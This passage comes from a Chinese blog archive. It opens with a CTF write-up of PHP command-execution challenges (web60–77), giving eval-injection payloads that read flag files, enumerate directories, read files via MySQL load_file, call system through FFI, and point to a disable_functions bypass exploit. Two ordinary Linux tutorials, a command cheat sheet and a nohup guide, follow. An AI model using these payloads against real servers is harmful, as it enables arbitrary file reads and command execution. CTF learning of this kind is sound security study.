class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h1><p>首先查找flag文件的地址<code>c=print_r(scandir(&#39;./&#39;));</code>找到在当前目录下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload汇总</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>同时记录一个,但是这道题不能用<code>$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3版本后 该函数已不再被使用</code>还有新姿势</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>()</span><br><span class="line"><span class="title function_ invoke__">rename</span>()</span><br><span class="line"><span class="comment">//用法：</span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);             <span class="comment">//过60</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);           <span class="comment">//过60</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web61-65"><a href="#web61-65" class="headerlink" title="web61-65"></a>web61-65</h1><p>为了熟悉学习新姿势<code>c=$a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false)&#123;echo $file.&quot; &quot;;&#125;</code>或者<code>c=print_r(scandir(current(localeconv())));</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload:</span></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h1><p>扫描目录<code>c=var_dump(scandir(&quot;/&quot;));</code>,发现是<code>flag.txt</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//下面是payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h1><p>快乐第一步扫描目录<code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//payload介绍</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>代码审计,这里先介绍几个函数<br>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
<p>然后看这里有一句官方的介绍</p>
<blockquote>
<p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//在网页中会输出内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="comment">//在这里则在网页当中没有输出内容，不难看出其取得了缓冲区的内容并清空了缓冲区</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>所以不难想出payload<code>c=require_once(&#39;/flag.txt&#39;);exit();</code>这里通过<code>exit();</code>使程序提前退出，绕过后面的正则表达式</p>
<h1 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;?&gt;&lt;?php echo 111;?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>这里的?&gt;是为了闭合前面&lt;?php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:https:<span class="comment">//github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</span></span><br><span class="line">需要把里面的payload进行url编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h1><p>第一步扫描目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">payload:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h1><p>第一步扫描目录</p>
<p><code>c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);</code></p>
<p>利用mysql load_file读文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><p>第一遍扫描目录<br>c&#x3D;$a&#x3D;new DirectoryIterator(“glob:&#x2F;&#x2F;&#x2F;*”);foreach($a as $f){echo($f-&gt;__toString().’ ‘);}exit(0);然后发现下面有一个readflag肯定是要调用这个,不会做，看了这个FFI拓展挺神奇的，说谁php7.4版本以上才有，大家想了解可以看看下面的参考链接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span>=<span class="title class_">FFI</span>::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux简单总结</title>
    <url>/Linux/Linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>收集一些常用的，免得我忘记了ε&#x3D;ε&#x3D;ε&#x3D;(<del>￣▽￣)</del></p>
<span id="more"></span>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -m                             显示机器的处理器架构</span><br><span class="line">uname -r                             显示正在使用的内核版本</span><br><span class="line">dmidecode -q                         显示硬件系统部件</span><br><span class="line">(SMBIOS / DMI) hdparm -i /dev/hda    罗列一个磁盘的架构特性</span><br><span class="line">hdparm -tT /dev/sda                  在磁盘上执行测试性读取操作系统信息</span><br><span class="line">arch                                 显示机器的处理器架构</span><br><span class="line">uname -m                             显示机器的处理器架构</span><br><span class="line">uname -r                             显示正在使用的内核版本</span><br><span class="line">dmidecode -q                         显示硬件系统部件 - (SMBIOS / DMI)</span><br><span class="line">hdparm -i /dev/hda                   罗列一个磁盘的架构特性</span><br><span class="line">hdparm -tT /dev/sda                  在磁盘上执行测试性读取操作</span><br><span class="line">cat /proc/cpuinfo                    显示CPU info的信息</span><br><span class="line">cat /proc/interrupts                 显示中断</span><br><span class="line">cat /proc/meminfo                    校验内存使用</span><br><span class="line">cat /proc/swaps                      显示哪些swap被使用</span><br><span class="line">cat /proc/version                    显示内核的版本</span><br><span class="line">cat /proc/net/dev                    显示网络适配器及统计</span><br><span class="line">cat /proc/mounts                     显示已加载的文件系统</span><br><span class="line">lspci -tv                            罗列 PCI 设备</span><br><span class="line">lsusb -tv                            显示 USB 设备</span><br><span class="line">date                                 显示系统日期</span><br><span class="line">cal 2007                             显示2007年的日历表</span><br><span class="line">date 041217002007.00                 设置日期和时间 - 月日时分年.秒</span><br><span class="line">clock -w                             将时间修改保存到 BIOS</span><br></pre></td></tr></table></figure>

<h2 id="关机-and-重启"><a href="#关机-and-重启" class="headerlink" title="关机 and 重启"></a>关机 and 重启</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now             关闭系统(1)</span><br><span class="line">init 0                      关闭系统(2)</span><br><span class="line">telinit 0                   关闭系统(3)</span><br><span class="line">shutdown -h hours:minutes &amp; 按预定时间关闭系统</span><br><span class="line">shutdown -h +10             10分钟后关机</span><br><span class="line">shutdown -c                 取消按预定时间关闭系统</span><br><span class="line">shutdown -r now             重启</span><br><span class="line">reboot                      重启</span><br><span class="line">logout                      注销</span><br></pre></td></tr></table></figure>

<h2 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home                      进入 / home 目录</span><br><span class="line">cd ..                         返回上一级目录</span><br><span class="line">cd ../..                      返回上两级目录</span><br><span class="line">cd                            进入个人的主目录</span><br><span class="line">cd ~user1                     进入个人的主目录</span><br><span class="line">cd -                          返回上次所在的目录</span><br><span class="line">pwd                           显示工作路径</span><br><span class="line">ls                            查看目录中的文件</span><br><span class="line">ls -F                         查看目录中的文件</span><br><span class="line">ls -l                         显示文件和目录的详细资料</span><br><span class="line">ls -a                         显示隐藏文件</span><br><span class="line">ls *[0-9]*                    显示包含数字的文件名和目录名</span><br><span class="line">tree                          显示文件和目录由根目录开始的树形结构(1)</span><br><span class="line">lstree                        显示文件和目录由根目录开始的树形结构(2)</span><br><span class="line">mkdir dir1                    创建一个叫做 dir1 的目录</span><br><span class="line">mkdir dir1 dir2               同时创建两个目录</span><br><span class="line">mkdir -p /tmp/dir1/dir2       创建一个目录树</span><br><span class="line">mv dir1 new_dir               重命名/移动 一个目录</span><br><span class="line">cp file1 file2                复制一个文件</span><br><span class="line">cp dir/* .                    复制一个目录下的所有文件到当前工作目录</span><br><span class="line">cp -a /tmp/dir1 .             复制一个目录到当前工作目录</span><br><span class="line">cp -a dir1 dir2               复制一个目录</span><br><span class="line">ln -s file1 lnk1              创建一个指向文件或目录的软链接</span><br><span class="line">ln file1 lnk1                 创建一个指向文件或目录的物理链接</span><br><span class="line">touch -t 0712250000 file1     修改一个文件或目录的时间戳 </span><br></pre></td></tr></table></figure>

<h2 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -name *liuyazhuang*     查找当前目录下名称中含有&quot;liuyazhuang&quot;的文件</span><br><span class="line">find / -name *.conf            查找根目录下（整个硬盘）下后缀为.conf的文件</span><br><span class="line">find / -perm 777               查找所有权限是777的文件</span><br><span class="line">find / -type d                 返回根目录下所有的目录</span><br><span class="line">whereis halt 显示一个二进制文件、源码或man的位置</span><br><span class="line">which halt 显示一个二进制文件或可执行文件的完整路径</span><br></pre></td></tr></table></figure>

<h2 id="文件的权限-使用-“-”-设置权限，使用-“-”-用于取消"><a href="#文件的权限-使用-“-”-设置权限，使用-“-”-用于取消" class="headerlink" title="文件的权限  使用 “+” 设置权限，使用 “-” 用于取消"></a>文件的权限  使用 “+” 设置权限，使用 “-” 用于取消</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lh                      显示权限</span><br><span class="line">ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示</span><br><span class="line">chmod ugo+rwx directory1    设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限</span><br><span class="line">chmod go-rwx directory1     删除群组(g)与其他人(o)对目录的读写执行权限</span><br><span class="line">chown user1 file1           改变一个文件的所有人属性</span><br><span class="line">chown -R user1 directory1   改变一个目录的所有人属性并同时改变改目录下所有文件的属性</span><br><span class="line">chgrp group1 file1          改变文件的群组</span><br><span class="line">chown user1:group1 file1    改变一个文件的所有人和群组属性</span><br><span class="line">find / -perm -u+s           罗列一个系统中所有使用了SUID控制的文件</span><br><span class="line">chmod u+s /bin/file1        设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限</span><br><span class="line">chmod u-s /bin/file1        禁用一个二进制文件的 SUID位</span><br><span class="line">chmod g+s /home/public      设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的</span><br><span class="line">chmod g-s /home/public      禁用一个目录的 SGID 位</span><br><span class="line">chmod o+t /home/public      设置一个文件的 STIKY 位 - 只允许合法所有人删除文件</span><br><span class="line">chmod o-t /home/public      禁用一个目录的 STIKY 位</span><br><span class="line">chmod +x                    文件路径 为所有者、所属组和其他用户添加执行的权限</span><br><span class="line">chmod -x                    文件路径 为所有者、所属组和其他用户删除执行的权限</span><br><span class="line">chmod u+x                   文件路径 为所有者添加执行的权限</span><br><span class="line">chmod g+x                   文件路径 为所属组添加执行的权限</span><br><span class="line">chmod o+x                   文件路径 为其他用户添加执行的权限</span><br><span class="line">chmod ug+x                  文件路径 为所有者、所属组添加执行的权限</span><br><span class="line">chmod =wx                   文件路径 为所有者、所属组和其他用户添加写、执行的权限，取消读权限</span><br><span class="line">chmod ug=wx                 文件路径 为所有者、所属组添加写、执行的权限，取消读权限</span><br></pre></td></tr></table></figure>

<h2 id="文件的特殊属性-，使用-“-”-设置权限，使用-“-”-用于取消"><a href="#文件的特殊属性-，使用-“-”-设置权限，使用-“-”-用于取消" class="headerlink" title="文件的特殊属性 ，使用 “+” 设置权限，使用 “-” 用于取消"></a>文件的特殊属性 ，使用 “+” 设置权限，使用 “-” 用于取消</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chattr +a file1 只允许以追加方式读写文件</span><br><span class="line">chattr +c file1 允许这个文件能被内核自动压缩/解压</span><br><span class="line">chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件</span><br><span class="line">chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接</span><br><span class="line">chattr +s file1 允许一个文件被安全地删除</span><br><span class="line">chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘</span><br><span class="line">chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件</span><br><span class="line">lsattr          显示特殊的属性</span><br></pre></td></tr></table></figure>

<h2 id="打包-and-压缩文件"><a href="#打包-and-压缩文件" class="headerlink" title="打包 and 压缩文件"></a>打包 and 压缩文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip   文件名.zip    压缩文件</span><br><span class="line">gzip  文件名        压缩文件</span><br><span class="line">gizp  –l 文件名.gz：显示压缩率</span><br><span class="line">unzip 文件名.zip    解压文件</span><br><span class="line">tar：归档文件</span><br><span class="line">tar -cvf out.tar liuyazhuang  打包一个归档（将文件&quot;liuyazhuang&quot;打包成一个归档）</span><br><span class="line">tar -xvf liuyazhuang.tar     释放一个归档（释放liuyazhuang.tar归档）</span><br><span class="line">tar -cvzf backup.tar.gz/etc  </span><br><span class="line">-z参数将归档后的归档文件进行gzip压缩以减少大小。</span><br><span class="line">-c：创建一个新tar文件</span><br><span class="line">-v：显示运行过程的信息</span><br><span class="line">-f：指定文件名</span><br><span class="line">-z：调用gzip压缩命令进行压缩</span><br><span class="line">-t：查看压缩文件的内容</span><br><span class="line">-x：解开tar文件</span><br><span class="line">tar  -cvf test.tar      *：将所有文件打包成test.tar扩展名.tar需自行加上</span><br><span class="line">tar  -zcvf test.tar.gz  *：将所有文件打包成test.tar再用gzip命令压缩</span><br><span class="line">tar -tf   test.tar ：   查看test.tar文件中包括了哪些文件</span><br><span class="line">tar -xvf test.tar       将test.tar解开</span><br><span class="line">tar -zxvf foo.tar.gz    解压缩</span><br></pre></td></tr></table></figure>

<h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat file1 从第一个字节开始正向查看文件的内容</span><br><span class="line">tac file1 从最后一行开始反向查看一个文件的内容</span><br><span class="line">more file1 查看一个长文件的内容</span><br><span class="line">less file1 类似于 more 命令，但是它允许在文件中和正向操作一样的反向操作</span><br><span class="line">head -2 file1 查看一个文件的前两行</span><br><span class="line">tail -2 file1 查看一个文件的最后两行</span><br><span class="line">tail -f /var/log/messages 实时查看被添加到一个文件中的内容</span><br></pre></td></tr></table></figure>

<h2 id="列出目录内容"><a href="#列出目录内容" class="headerlink" title="列出目录内容"></a>列出目录内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -a：显示所有文件（包括隐藏文件）；</span><br><span class="line">ls -l：显示详细信息；</span><br><span class="line">ls -R：递归显示子目录结构；</span><br><span class="line">ls -ld：显示目录和链接信息；</span><br><span class="line">ctrl+r：历史记录中所搜命令（输入命令中的任意一个字符）；</span><br><span class="line">Linux中以.开头的文件是隐藏文件；</span><br><span class="line">pwd:显示当前目录</span><br></pre></td></tr></table></figure>

<h2 id="查看文件的类型"><a href="#查看文件的类型" class="headerlink" title="查看文件的类型"></a>查看文件的类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:查看文件的类型</span><br></pre></td></tr></table></figure>

<h1 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h1><p>grep：功能：在文件中搜索匹配的字符并进行输出</p>
<p>格式：grep[参数] &lt;要找的字串&gt; &lt;要寻找字 串的源文件&gt;<br>greplinux test.txt：搜索test.txt文件中字符串linux并输出</p>
<h1 id="ln命令"><a href="#ln命令" class="headerlink" title="ln命令"></a>ln命令</h1><p>功能：在文件和目录之间建立链接</p>
<p>格式：<code>ln [参数] &lt;源文件或目录&gt; &lt;目标文件或目录&gt;</code></p>
<p>链接分<code>软链接</code>和<code>硬链接</code></p>
<p>1.软链接<br>ln–s &#x2F;usr&#x2F;share&#x2F;do  doc ：创建一个链接文件doc并指向目录&#x2F;usr&#x2F;share&#x2F;do</p>
<p>2.硬链接<br>ln  &#x2F;usr&#x2F;share&#x2F;test  hard：创建一个硬链接文件hard，这时对于test文件对应 的存储区域来说，又多了一个文件指向它</p>
<h1 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h1><p>vim拥有三种模式：命令模式、插入模式、ex模式</p>
<ul>
<li><p>命令模式（常规模式）<br>vim启动后，默认进入命令模式，任何模式都可以通过esc键回到命令模式（可以多按几次），命令模式下可以键入不同的命令完成选择、复制、粘贴、撤销等操作。<br>命名模式常用命令如下：<br>i : 在光标前插入文本；<br>o:在当前行的下面插入新行；<br>dd:删除整行；<br>yy：将当前行的内容放入缓冲区（复制当前行）<br>n+yy :将n行的内容放入缓冲区（复制n行）<br>p:将缓冲区中的文本放入光标后（粘贴）<br>u：撤销上一个操作<br>r:替换当前字符<br>&#x2F; 查找关键字</p>
</li>
<li><p>插入模式<br>在命令模式下按 “ i “键，即可进入插入模式，在插入模式可以输入编辑文本内容，使用esc键可以返回命令模式。</p>
</li>
<li><p>ex模式<br>在命令模式中按” : “键可以进入ex模式，光标会移动到底部，在这里可以保存修改或退出vim.<br>ext模式常用命令如下：<br>:w ：保存当前的修改<br>:q ：退出<br>:q! ：强制退出，保存修改<br>:x  :保存并退出，相当于:wq<br>:set number 显示行号<br>:! 系统命令  执行一个系统命令并显示结果<br>:sh ：切换到命令行，使用ctrl+d切换回vim</p>
</li>
</ul>
]]></content>
      <categories>
        <category>指令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>nohup命令</title>
    <url>/Linux/nohup%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用 nohup 命令。</p>
<span id="more"></span>

<h1 id="命令简介"><a href="#命令简介" class="headerlink" title="命令简介"></a>命令简介</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup Command [ Arg … ] [ &amp; ]</span><br></pre></td></tr></table></figure>

<p>该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。<code>nohup</code>就是不挂起的意思（<code>no hang up</code>）。</p>
<p><code>nohup</code> 运行由 <code>Command</code> 和相关的 <code>Arg</code> 参数指定的命令，忽略所有挂断（<code>SIGHUP</code>）信号。要运行后台中的 <code>nohup</code> 命令，添加 <code>&amp;</code> （ 表示 <code>and</code> 的符号）到命令的尾部。</p>
<p>如果使用 <code>nohup</code> 命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为 nohup.out 的文件中，除非另外指定了输出文件。</p>
<h1 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，运行命令 <code>java -jar adapter-minisite.jar</code> 输入参数 <code>/tomcat-1</code> 和 <code>/tomcat-2</code>，输出被重定向到 <code>logs.txt</code> 文件中。</p>
<h1 id="退出任务"><a href="#退出任务" class="headerlink" title="退出任务"></a>退出任务</h1><p>如果运行的任务在当前 <code>shell</code> 终端，可以通过 <code>jobs</code> 命令查询相关信息，并且杀掉进程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看当前 shell 终端的后台运行任务进程信息</span><br><span class="line">$ jobs</span><br><span class="line">[1]+ Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"># 杀掉任务号</span><br><span class="line">$ kill %1</span><br><span class="line"></span><br><span class="line"># 或着找到 pid</span><br><span class="line">$ jobs -l</span><br><span class="line">[1]+ 11076 Running nohup java -jar adapter-minisite.jar /tomcat-1 /tomcat-2 &gt; logs.txt 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">$ kill 11076</span><br><span class="line"></span><br><span class="line"># 或着</span><br><span class="line">$ fg %n # 置为前端运行</span><br><span class="line"></span><br><span class="line">Ctrl + c # 退出</span><br></pre></td></tr></table></figure>

<p>如果非当前 <code>shell</code> 终端，可以通过 <code>ps auxf | grep adapter-minisite</code> 获取 <code>pid</code> 然后 <code>kill pid</code>。</p>
]]></content>
      <categories>
        <category>指令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA知识点整理</title>
